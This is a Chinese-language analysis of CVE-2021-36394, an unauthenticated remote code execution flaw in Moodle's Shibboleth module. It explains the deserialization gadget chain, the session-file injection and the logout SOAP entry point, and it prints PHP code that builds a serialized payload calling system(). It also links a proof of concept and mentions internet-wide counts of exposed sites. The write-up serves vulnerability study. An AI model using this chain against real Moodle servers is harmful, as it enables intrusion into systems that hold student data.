@@ -1,0 +1,119 @@
+## 漏洞简介
+`Moodle` 是世界上最流行的学习管理系统。在几分钟内开始创建您的在线学习网站！
+`Moodle`的`Shibboleth`认证模块存在一个未授权远程代码执行漏洞。这在大学中被广泛使用，以允许来自一所大学的学生与其他大学进行身份验证，从而使他们能够参加外部课程并与其他人一起玩乐。
+## 漏洞影响
+    3.11, 3.10 to 3.10.4, 3.9 to 3.9.7 and earlier unsupported versions
+需要开启 `Shibboleth` 认证模块
+可以 `fofa` 查看其使用，可以看到有 `13w` 条 `moodle` 应用
+## 环境搭建
+为了省去一些麻烦，这里我已经搭建好了漏洞 `docker`，可以在这里找到 [CVE-2021-36394 Pre-Auth RCE in
+Moodle](https://github.com/N0puple/poc-set/tree/main/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle)
+执行如下操作
+    docker-compose up -d
+然后进入 `docker` ，更改文件 `/var/www/html/moodle-3.11.0/config.php`
+    $CFG->wwwroot   = 'http://127.0.0.1';
+将上面的链接改为自己的，必须是真实地址
+## 漏洞分析
+根据作者
+[博客](https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/)
+上讲的，此漏洞大概可分为三部分，`session` 文件写入，`moodle` 反序列化链，反序列化执行入口
+### moodle 反序列化链
+先来看反序列化链，这并没有在 `PHPGGC` 收录，所以需要自己找，这里提供一条的简单分析，对细节感兴趣的童鞋可以调试一下
+首先是 `__destruct` 入口，位于 `lib/classes/lock/lock.php`
+可以看到 `$key` 可控，并且在字符串中，因此可以触发 `__toString`
+我们选择 `availability/classes/tree.php` 中的 `__toString` ，如图
+`$this->children` 可控，因此可以对象遍历，我们可以选一个可以让我们命令执行的类，选择
+`lib/classes/dml/recordset_walk.php` 的 `core\dml\recordset_walk` ，因为这里有一个
+`current` 方法可以 `call_user_func` ，并且参数可控
+`$this->callback` 可控，`$resord` 由 `$this->recordset->current()` 得到，我们可以看到
+`$this->recordset` ，需要实现的方法有很多，结合定义可以知道，`$this->recordset` 必须实现 `Iterator`
+，因此范围就可以缩得比较小，最终确定使用 `question/engine/questionusage.php` 中的
+`question_attempt_iterator` 类，但这个类默认没有被加载，需要一个类作为中介，这里可以选择
+`question/classes/external.php` 中的 `core_question_external`
+如此即可得到反序列化链
+    key = $class;
+            }
+        }
+    }
+    namespace core_availability{
+        class tree {
+            public function __construct($class)
+            {
+                $this->children = $class;
+            }
+        }
+    }
+    namespace core\dml{
+        class recordset_walk {
+            public function __construct($class)
+            {
+                $this->recordset = $class;
+                $this->callbackextra = null;
+                $this->callback = "system";
+            }
+        }
+    }
+    namespace {
+        class question_attempt_iterator{
+            public function __construct($class)
+            {
+                $this->slots = array(
+                    "xxx" => "key"
+                );
+                $this->quba = $class;
+            }
+        }
+        class question_usage_by_activity{
+            public function __construct()
+            {
+                $this->questionattempts = array(
+                    "key" => "whoami"
+                );
+            }
+        }
+        class core_question_external{
+        }
+        $add_lib = new core_question_external();
+        $activity = new question_usage_by_activity();
+        $iterator = new question_attempt_iterator($activity);
+        $walk = new core\dml\recordset_walk($iterator);
+        $tree = new core_availability\tree($walk);
+        $lock = new core\lock\lock($tree);
+        $arr = array($add_lib, $lock);
+        $value = serialize($arr);
+        echo $value;
+    }
+### session 文件写入
+接下来我们要想办法将反序列化后的内容写入 `session` 文件
+来到文件 `grade/report/grader/index.php` ，这是我们可以直接访问到的文件，来看看有什么处理
+`required_param` 与 `option_param` 差不多，一个是必须，一个是可选，都是获取参数，这里可以看到 `id` 是必须的，且为
+`int` 类型，其他的都是可选的，继续看下面的
+可以看到，`$graderreportsifirst` 与 `$graderreportsilast` 被写入了 `$SESSION` ，也就是上面的
+`sifirst` 和 `silast`，而 `$SESSION` 是 `global` 修饰的，指向 `$GLOBALS['SESSION']` ，在
+`lib/classes/session/manager.php` 中赋值
+默认 `session` 会存储在文件中，因此我们的反序列化 `payload` 就会被写入 `session` 的文件存储起来，但是存储进
+`session` 文件的 `payload` 如何被成功反序列化呢？这就看最关键的下一部分
+### 反序列化执行入口
+反序列化执行的入口出在 `Shibboleth` 认证模块，需要管理者开启该认证模块才可以使用，默认是不开启的，因此降低了此漏洞的影响面，但全网存在的
+`moodle` 系统实在是多，所以影响还是可以的。
+来到 `auth/shibboleth/logout.php`
+首先是获取了输入流赋值给 `$inputstream` ，当 `$inputstream` 不为空时，会使用 `soap`
+来处理，`$server->handle()` 默认处理输入流中的数据， 构造如下 `xml` 数据流访问就可以访问到
+`LogoutNotification` 函数
+                xxxx
+这里会先获取 `session` 存储的方式，文件存储与数据库存储，默认为文件存储，这时会进入
+`\auth_shibboleth\helper::logout_file_session($spsessionid);`
+这里获取了 `session` 存储的位置，然后遍历所有文件，获取内容，最后进入 `self::unserializesession($data[0]);`
+这里首先以 `|` 分割字符串，然后以2个为一组，将每组的第二个反序列化，这里就解决了第二部分的问题，可以构造包含 `|` 与 `payload`
+的字符串，就可以成功反序列化 `payload` ，构造如下
+    aaaaaa|......payload......|bbbbbb
+## 漏洞复现
+复现 `POC` 已上传 `github` [传送门](https://github.com/N0puple/poc-set/tree/main/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle)
+，需要注意的是，这个命令执行是无回显的，这里借助 `ceye` 平台进行测试
+使用 `docker-compose.yml` 搭建环境
+使用 `moodle_unserialize_rce.php` 生成反序列化字符串
+使用 `moodle_rce.py` 进行测试
+查看 `ceye` 平台
+## 参考链接
+  * 
+  * 
